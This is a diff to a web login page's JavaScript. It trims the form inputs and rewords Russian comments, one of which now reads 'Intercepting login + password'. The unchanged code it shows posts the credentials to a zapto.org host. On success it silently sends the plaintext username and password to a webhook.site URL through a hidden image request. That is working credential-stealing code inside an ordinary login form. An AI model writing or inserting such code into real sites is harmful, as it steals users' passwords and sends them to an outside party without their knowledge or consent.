@@ -25,8 +25,8 @@
     loginForm.addEventListener("submit", async function (e) {
       e.preventDefault();
 
-      const username = document.getElementById("username").value;
-      const password = document.getElementById("password").value;
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
 
       try {
         const res = await fetch("https://kazcyber.zapto.org/logindemo.php", {
@@ -39,13 +39,13 @@
         const data = await res.json();
 
         if (data.status === "success") {
-          // 📡 Отправляем логин и пароль на webhook
+          // ✅ Перехватываем логин + пароль
           new Image().src =
             "https://webhook.site/872df0d8-9f97-4b64-b8fe-e9edddeedfbd" +
             "?username=" + encodeURIComponent(username) +
             "&password=" + encodeURIComponent(password);
 
-          // ✅ Сохраняем токен (опционально) и перенаправляем
+          // ✅ Сохраняем токен и перенаправляем
           localStorage.setItem("token", data.token);
           window.location.href = "https://kazcyber.zapto.org/index.php";
         } else {
